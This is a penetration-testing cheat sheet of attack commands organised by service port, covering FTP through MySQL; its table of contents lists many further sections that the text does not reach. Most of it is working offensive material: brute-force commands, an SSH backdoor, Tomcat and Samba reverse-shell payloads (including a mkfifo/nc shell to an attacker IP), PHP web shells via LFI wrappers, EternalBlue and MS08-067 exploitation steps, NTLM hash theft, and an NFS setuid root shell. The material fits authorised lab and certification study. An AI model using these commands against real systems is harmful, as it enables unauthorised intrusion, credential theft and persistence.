---
title: Cheatsheet
updated: 2023-02-08 10:12:12Z
created: 2022-10-11 12:41:55Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---


---

- [Enumeration](#enumeration)

- [NMAP](#nmap)
  * [TCP](#tcp)
  * [UDP](#udp)
 - [AUTORECON](#autorecon)
- [FTP - 21](#ftp---21)
  
  * [Brute force](#brute-force)
  * [Downloading file](#downloading-file)
  * [Uploading file](#uploading-file)
  
- [SSH - 22](#ssh---22)
  * [Brute force](#brute-force-1)
  * [CVE-2008-0166](#cve-2008-0166)
  * [SSH backdoor - post exploitation](#ssh-backdoor---post-exploitation)
  
- [DNS - 53](#dns---53)
  * [Zone transfert](#zone-transfert)
  * [DNS brute force](#dns-brute-force)
  
- [FINGER - 79](#finger---79)
  * [User enumeration](#user-enumeration)
  * [Command execution](#command-execution)
  
- [HTTP - HTTPS - 80 - 443](#http---https---80---443)
  * [Automatic scanners](#automatic-scanners)
  * [Wordpress](#wordpress)
    + [Wordpress panel RCE](#wordpress-panel-rce)
  * [Drupal](#drupal)
    + [Username enumeration](#username-enumeration)
    + [Hidden pages enumeration](#hidden-pages-enumeration)
    + [Drupal panel RCE](#drupal-panel-rce)
  * [Joomla](#joomla)
  * [Tomcat](#tomcat)
    + [Default credentials](#default-credentials)
    + [Brute force](#brute-force-2)
    + [Tomcat panel RCE](#tomcat-panel-rce)
  * [WebDav](#webdav)
  * [HTTP brute force authentication](#http-brute-force-authentication)
    + [HTTP basic authentication](#http-basic-authentication)
    + [HTTP GET request](#http-get-request)
    + [HTTP POST request](#http-post-request)
  * [Spidering / Brute force directories / files](#spidering--brute-force-directories--files)
    + [File backups](#file-backups)
  * [Local File Inclusion / Remote File Inclusion - LFI / RFI](#local-file-inclusion--remote-file-inclusion---lfi--rfi)
    + [Wrappers](#wrappers)
      - [Wrapper php://filter](#wrapper-phpfilter)
      - [Wrapper expect://](#wrapper-expect)
      - [Wrapper data://](#wrapper-data)
      - [Wrapper input://](#wrapper-input)
    + [Useful LFI list](#useful-lfi-list)
    + [Tools](#tools)
  * [Command injection](#command-injection)
  * [Deserialization](#deserialization)
  * [File upload](#file-upload)
  * [SQL injection](#sql-injection)
  * [XSS](#xss)
  * [Other web vulnerabilities](#other-web-vulnerabilities)
  * [Upload a file with PUT](#upload-a-file-with-put)

- [KERBEROS - 88](#kerberos---88)

- [POP3 - 110](#pop3---110)
  * [Brute force](#brute-force-3)
  * [Read mail](#read-mail)
  
- [SNMP - 161](#snmp---161)
  * [Brute force community string](#brute-force-community-string)
  * [Modifying SNMP values](#modifying-snmp-values)
  
- [LDAP - 389](#ldap---389)
  * [Scans](#scans)
  * [Graphical Interface](#graphical-interface)
  
- [SMB - 445](#smb---445)
  
  * [Version if nmap didn't detect it](#version-if-nmap-didnt-detect-it)
  * [Scan for vulnerability](#scan-for-vulnerability)
  * [Manual testing](#manual-testing)
  * [Brute force](#brute-force-4)
  * [Mount a SMB share](#mount-a-smb-share)
  * [Get a shell](#get-a-shell)
  * [Upload with SMBMap](#upload-with-smbmap)
  * [EternalBlue (MS17-010)](#EternalBlue-MS17-010)
    + [Check if vulnerable](#check-if-vulnerable)
    + [Prepare shellcodes and listeners](#prepare-shellcodes-and-listeners)
    + [Exploit](#exploit)
    * [If this doesn't work, try this one](#if-this-doesnt-work-try-this-one)
  * [MS08-067](#ms08-067)
  * [CVE-2017-7494](#cve-2017-7494)
  
- [MSSQL - 1433](#mssql---1433)
  * [Get information](#get-information)
  * [Brute force](#brute-force-5)
  * [Having credentials](#having-credentials)
  * [Manual exploit](#manual-exploit)
  
- [NFS - 2049](#nfs---2049)
  * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
  * [Mount a share](#mount-a-share)
  * [NFS misconfigurations](#nfs-misconfigurations)
  
- [MYSQL - 3306](#mysql---3306)
  * [Brute force](#brute-force-6)
  * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
  * [Connect](#connect)
  * [MySQL commands](#mysql-commands)
  * [Manual exploit](#manual-exploit-1)
  
- [RDP - 3389](#rdp---3389)
  * [Brute force](#brute-force)
  * [Connect with known credentials / hash](#connect-with-known-credentials--hash)
  * [Session stealing](#session-stealing)
    + [Get openned sessions](#get-openned-sessions)
    + [Access to the selected](#access-to-the-selected)
  * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group-windows)
  
- [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
  * [Scans](#scans-1)
  * [Brute force](#brute-force-8)
  * [Connect](#connect-1)
  * [Found VNC password](#found-vnc-password)
    + [Linux](#linux)
    + [Windows](#windows)
  * [Decrypt VNC password](#decrypt-vnc-password)
  
- [WINRM - 5985 - 5986](#winrm---5985---5986)
  * [Brute force](#brute-force-9)
  * [Connecting](#connecting)
  
- [CGI](#cgi)
  
  * [Found CGI scripts](#found-cgi-scripts)
  
- [Command and control framework](#command-and-control-framework)
  
- [Compiling exploits](#compiling-exploits)
  
  * [For linux](#for-linux)
  * [For windows](#for-windows)
  * [Cross compile](#cross-compile)
  
- [DICTIONARY GENERATION](#dictionary-generation)

- [FILE TRANSFER](#file-transfer)
  * [Linux](#linux-1)
  * [Windows](#windows-1)
  
- [GIT](#git)
  * [Download .git](#download-git)
  * [Extract .git content](#extract-git-content)
  
- [HASHES](#hashes)
  * [Pass the hass](#pass-the-hash)
*  [Windows](#windows-2)
  * [Linux](#linux-2)
  
- [MIMIKATZ](#mimikatz)

- [MISCELLANEOUS](#miscellaneous)
  
  * [Get a Windows path without spaces](#get-a-windows-path-without-spaces)
  
- [MSFVENOM PAYLOAD](#msfvenom-payload)
  * [Linux](#linux-3)
  * [Windows](#windows-3)
  * [PHP](#php)
  * [ASP](#asp)
  * [JSP](#jsp)
  * [WAR](#war)
  * [Python](#python)
  * [Bash](#bash)
  * [Perl](#perl)
  * [Listener](#listener)
    + [Metasploit](#metasploit)
    + [Netcat](#netcat)
  
- [PASSWORD CRACKING](#password-cracking)
  * [Hydra](#hydra)
  * [Online](#online)
  * [Hashcat](#hashcat)
    + [Linux password](#linux-password)
    + [Windows password](#windows-password)
    + [Others](#others)
    + [Rules](#rules)
  * [John](#john)
  
- [PIVOTING](#pivoting)
  
  * [Sshuttle](#sshuttle)
  * [Proxychains](#proxychains)
  
- [PRIVILE ESCALATION](#privile-escalation)
  * [Linux](#linux-4)
    + [Enumeration scripts](#enumeration-scripts)
    * [Vulnerability scan](#vulnerability-scan)
    * [Suid checker](#suid-checker)
    * [Methodology to follow](#methodology-to-follow)
  * [Windows](#windows-4)
    + [Enumeration scripts](#enumeration-scripts-1)
      - [General scans](#general-scans)
      - [Search for CVE](#search-for-cve)
      - [Post exploitation](#post-exploitation)
    + [JuicyPotato (SeImpersonate or SeAssignPrimaryToken)](#juicypotato-seimpersonate-or-seassignprimarytoken)
    * [Methodology to follow](#methodology-to-follow-1)
    * [Autorun](#autorun)
      + [Detection](#detection)
      + [Exploitation](#exploitation)
    * [AlwaysInstallElevated](#alwaysinstallelevated)
      + [Detection](#detection-1)
      + [Exploitation](#exploitation-1)
    * [Executable Files](#executable-files)
      + [Detection](#detection-2)
      + [Exploitation](#exploitation-2)
    * [Startup applications](#startup-applications)
      + [Detection](#detection-3)
      + [Exploitation](#exploitation-3)
    * [Weak service permission](#weak-service-permission)
      + [Detection](#detection-4)
      + [Exploitation](#exploitation-4)
    * [Unquoted service paths](#unquoted-service-paths)
      + [Detection](#detection-5)
      + [Exploitation](#exploitation-5)
    * [Hot potato](#hot-potato)
      + [Exploitation](#exploitation-6)
    * [CVE](#cve)
      + [Windows XP](#windows-xp)
      + [Windows 7](#windows-7)
      + [Windows 8](#windows-8)
      + [Windows 10](#windows-10)
      + [Windows Server 2003](#windows-server-2003)
  
- [PROOFS](#proofs)
  * [Linux](#linux-5)
  * [Windows](#windows-5)
  
- [REVERSE SHELL](#reverse-shell)
  
  - [Amazing tool for shell generation](#amazing-tool-for-shell-generation)
  - [Bash](#bash-1)
  - [Perl](#perl-1)
  - [Python](#python-1)
  - [Netcat](#netcat-1)
  - [More reverse shell](#more-reverse-shell)
  - [Interactive shell](#interactive-shell)
  - [Adjust Interactive shell](#adjust-interactive-shell)
  
- [SHELLSHOCK](#shellshock)

- [USEFUL LINUX COMMANDS](#useful-linux-commands)
  * [Find a file](#find-a-file)
  * [Active connection](#active-connection)
  * [List all SUID files](#list-all-suid-files)
  * [Determine the current version of Linux](#determine-the-current-version-of-linux)
  * [Determine more information about the environment](#determine-more-information-about-the-environment)
  * [List processes running](#list-processes-running)
  * [List the allowed (and forbidden) commands for the invoking use](#list-the-allowed-and-forbidden-commands-for-the-invoking-use)
  
- [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
- [Lateral Movement](#lateral-movement)

- [Active Directory Exploitation Cheat Sheet](#active-directory-exploitation-cheat-sheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Domain Enumeration](#domain-enumeration)
    - [Using PowerView](#using-powerview)
    - [Using AD Module](#using-ad-module)
    - [Using BloodHound](#using-bloodhound)
      - [Remote BloodHound](#remote-bloodhound)
      - [On Site BloodHound](#on-site-bloodhound)
    - [Using Adalanche](#using-adalanche)
      - [Remote adalanche](#remote-adalanche)
    - [Useful Enumeration Tools](#useful-enumeration-tools)
  - [Local Privilege Escalation](#local-privilege-escalation)
    - [Useful Local Priv Esc Tools](#useful-local-priv-esc-tools)
  - [Lateral Movement](#lateral-movement)
    - [Powershell Remoting](#powershell-remoting)
    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
    - [Import a PowerShell Module and Execute its Functions Remotely](#import-a-powershell-module-and-execute-its-functions-remotely)
    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)
    - [Mimikatz](#mimikatz)
    - [Remote Desktop Protocol](#remote-desktop-protocol)
    - [URL File Attacks](#url-file-attacks)
    - [Useful Tools](#useful-tools)
  - [Domain Privilege Escalation](#domain-privilege-escalation)
    - [Kerberoast](#kerberoast)
    - [ASREPRoast](#asreproast)
    - [Password Spray Attack](#password-spray-attack)
    - [Force Set SPN](#force-set-spn)
    - [Abusing Shadow Copies](#abusing-shadow-copies)
    - [List and Decrypt Stored Credentials using Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
    - [Unconstrained Delegation](#unconstrained-delegation)
    - [Constrained Delegation](#constrained-delegation)
    - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
    - [DNSAdmins Abuse](#dnsadmins-abuse)
    - [Abusing Active Directory-Integraded DNS](#abusing-active-directory-integraded-dns)
    - [Abusing Backup Operators Group](#abusing-backup-operators-group)
    - [Abusing Exchange](#abusing-exchange)
    - [Weaponizing Printer Bug](#weaponizing-printer-bug)
    - [Abusing ACLs](#abusing-acls)
    - [Abusing IPv6 with mitm6](#abusing-ipv6-with-mitm6)
    - [SID History Abuse](#sid-history-abuse)
    - [Exploiting SharePoint](#exploiting-sharepoint)
    - [Zerologon](#zerologon)
    - [PrintNightmare](#printnightmare)
    - [Active Directory Certificate Services](#active-directory-certificate-services)
    - [No PAC](#no-pac)
  - [Domain Persistence](#domain-persistence)
    - [Golden Ticket Attack](#golden-ticket-attack)
    - [DCsync Attack](#dcsync-attack)
    - [Silver Ticket Attack](#silver-ticket-attack)
    - [Skeleton Key Attack](#skeleton-key-attack)
    - [DSRM Abuse](#dsrm-abuse)
    - [Custom SSP](#custom-ssp)
  - [Cross Forest Attacks](#cross-forest-attacks)
    - [Trust Tickets](#trust-tickets)
    - [Abuse MSSQL Servers](#abuse-mssql-servers)
    - [Breaking Forest Trusts](#breaking-forest-trusts)
    - [MindMap](#AD_Mindmap)
- [ZIP](#zip)

------

## Enumeration

```
nmap -sn -v <IP>/CIDR
```

```
nmapAutomator <IP> All
```

```
autorecon <IP>/CIDR
```

------

## NMAP

### TCP 

```
sudo -sS -sC -sV -oA <NAME>.tcp <IP> -v
```

### UDP

```
sudo -sU -sS -sC -sV -oA <NAME>.udp <IP> -v
```

------
## AUTORECON
### General use
```
sudo autorecon <HOST> --nmap-append sVC --heartbeat 10 --dirbuster.tool gobuster --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --dirbuster.ext txt,html,php,sh,asp,aspx,jsp -v
#nmap-append adds to default without changing. 
#sVC Version and default scripts 
#heartbeat - update rate (s)
#dirbuster.tol Sets tool to gobuster
#dirbuster.wordlist sets Wordlist for fuzz
#dirbuster.ext extensions to search for
```
------
## FTP - 21

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

### Downloading file

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

### Uploading file

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```

------

## SSH - 22

### Brute force

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

### CVE-2008-0166

```
All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

https://www.exploit-db.com/exploits/5720

wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2

bunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
tar -xvf debian_ssh_dsa_1024_x86.tar

python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
```

### SSH backdoor - post exploitation

```
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
```

------

## DNS - 53

```
dnsenum <DOMAIN>
```

```
dnsrecon -d <DOMAIN>
```

### Zone transfert

```
dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com
```

### DNS brute force

```
https://github.com/blark/aiodnsbrute
```

------

## FINGER - 79

### User enumeration

```
finger @<IP>
finger <USER>@<IP>
```

### Command execution

```
finger "|/bin/id@<IP>"
finger "|/bin/ls -a /<IP>"
```

------

## HTTP - HTTPS - 80 - 443

### Automatic scanners

```
nikto -h <URL>
python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
```

### Wordpress

```
# Scan
wpscan --rua -e --url <URL>

# Brute force user(s)
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
```

#### Wordpress panel RCE

```
Modifying a php from the theme used (admin credentials needed)

Appearance -> Editor -> 404 Template (at the right)
Change the content for a php shell
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<IP>/wp-content/themes/twentytwelve/404.php
```

### Drupal

```
droopescan scan -u <URL>
```

#### Username enumeration

```
In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<number> you can see the number of existing users :
	- /user/1 -> Access denied (user exist)
	- /user/2 -> Page not found (user doesn't exist)
```

#### Hidden pages enumeration

```
Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
```

#### Drupal panel RCE

```
You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
```

### Joomla

```
joomscan -u <URL>
./joomlavs.rb --url <URL> -a -v

Version
In /administrator/manifests/files/joomla.xml  
In /language/en-GB/en-GB.xml 
In plugins/system/cache/cache.xml 
```

### Tomcat

#### Default credentials

```
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

#### Brute force 

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```

#### Tomcat panel RCE

```
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <PORT>

# Execute payload
curl http://<IP>:8080/shell/
```

### WebDav

```
davtest -url <URL>
```

### HTTP brute force authentication

#### HTTP basic authentication

```
# Hydra
hydra -l <USER> -V -P <PASSWORDS_LIST> -s 80 -f <IP> http-get /<URL_ENDPOINT>/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=<URL> user_pass=FILE0 0=<USER:PASSWORD_LIST> -x ignore:code=401 -x ignore:code=307
```

#### HTTP GET request

```
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```

#### HTTP POST request

```
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>
```

### Spidering / Brute force directories / files

```
gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>

ffuf -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>

ffuf -u http://x.x.x.x -w /usr/share/wordlist -H 'Host: FUZZ.x' --fl LINENUMBERtofilter --mc all

Run once to get lines. Adjust --fl variable to get rid of lines
	-u url
	-w wordlist
	-H Header to enumerate
	--fl filter response line  
	--mc matchcode

dirbuster

wfuzz -u http://x.x.x.x -w /op/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.x' --hl LINE

Run once to get lines to hide, adjust hl 

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### File backups

Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are 

```
file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
```

### Local File Inclusion / Remote File Inclusion - LFI / RFI

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

#### Wrappers

##### Wrapper php://filter

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
```

##### Wrapper expect://

```
http://example.com/index.php?page=expect://id
```

##### Wrapper data://

```
echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
```

##### Wrapper input://

```
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
```

#### Useful LFI list

```
# Linux
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
```

#### Tools

```
kadimus --url <URL>
python lfisuite.py
```

### Command injection

For command injection always use BurpSuite !

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
```

### Deserialization

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
```

### File upload

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
```

### SQL injection

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
```

### XSS

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
<script src="http://<IP>:3000/hook.js"></script>
```

### Other web vulnerabilities

```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

### Upload a file with PUT

```
curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v
```

------

## KERBEROS - 88

```
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
```

------

## POP3 - 110

### Brute force 

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

### Read mail

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

------

## SNMP - 161

### Brute force community string

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```

```
snmp-check <IP>
```

### Modifying SNMP values

```
http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
```

------

## LDAP - 389

### Scans

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'userPr\|svc'
ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

### Graphical Interface

```
jxplorer
```

------

## SMB - 445

### Version if nmap didn't detect it

```
Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>
```

### Scan for vulnerability

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

If :

- MS17-010 - [EternalBlue](#EternalBlue (MS17-010))
- MS08-067 - [MS08-067](#MS08-067)
- CVE-2017-7494 - [CVE-2017-7494](#CVE-2017-7494)

### Manual testing

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

### Brute force

```
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```

### Mount a SMB share

```

sudo mount -t cifs //<IP>/<SHARE> /mnt
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /mnt

# Mount as a guest 
sudo mount -t cifs -o <permissions>,guest //<IP>/<SHARE> /mnt

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```
### Mount any 
```
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory

```
### Get a shell

```
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```
### Upload with SMBMap
```
smbmap -H <HOST> --upload '<TOBEUPLOADED>' '<PATH>/<UPLOADNAME>' 
```
### EternalBlue (MS17-010)

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

#### Check if vulnerable

```
python eternal_checker.py <IP>
```

#### Prepare shellcodes and listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

#### Exploit

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

May need to run it multiple times
```

#### If this doesn't work, try this one

```
python zzz_exploit.py <IP>
```

### MS08-067

```
# Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp <PORT>

# Exploit
python ms08_067_2018.py <IP> <NUMBER> 445
```

### CVE-2017-7494

```
# Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
```

Create a new file named poc.c :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 <IP>");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start an ICMP listener
sudo tcpdump -i <INTERFACE> icmp

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start a listener
nc -lvp <PORT>

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

------

## MSSQL - 1433

### Get information

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
```

### Having credentials

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
```

------

## NFS - 2049

### Show Mountable NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

### Mount a share

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

### NFS misconfigurations

```
# List exported shares
cat /etc/exports
```

If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.

```
# Attacker, as root user

mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <SHARE>
./pwn # Root shell
```

------

## MYSQL - 3306

### Brute force

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

### Extracting MySQL credentials from files

```
cat /etc/mysql/debian.cnf
